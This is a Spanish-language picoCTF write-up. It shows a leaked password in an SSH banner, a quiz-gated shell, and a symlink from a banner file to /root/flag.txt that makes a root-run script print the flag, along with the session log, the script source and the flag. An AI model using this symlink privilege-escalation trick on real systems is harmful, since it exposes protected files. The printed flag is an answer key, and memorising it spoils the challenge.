# Reto
# Descripcion
The server has been leaking some crucial information on `tethys.picoctf.net 51237`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 54562`. From the above information abuse the machine and find the flag in the /root directory.
# Solucion

```
vladi@911:~/Desktop/retos/reto$ nc tethys.picoctf.net 51237
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
vladi@911:~/Desktop/retos/reto$ nc tethys.picoctf.net 54562
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
john
player@challenge:~$ ls  
ls
banner  text
player@challenge:~$ cd /root	
cd /root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ python3 script.py
python3 script.py
*************************************
**************WELCOME****************
*************************************

what is the password? 


player@challenge:/root$ cat script.py	
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:/root$ cd
cd

player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner

```
### Flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}
# Notas
Al conectarme al primer puerto el servidor me respondio con una contraseña, despues me conecte al segundo puerto que al entrar me hacia un cuestionario, despues de responder me dejo entrar al shell, revisando root aparece un script en py que es el que abre al entrar al puerto, tambien viene un flag.txt que no me deja abir asi que aprovecho que el script abre el banner del inicio para abrir el flag, me volvi a conectar al servidor y en lugar de imprimir el banner me dio la bandera. 
# Referencias
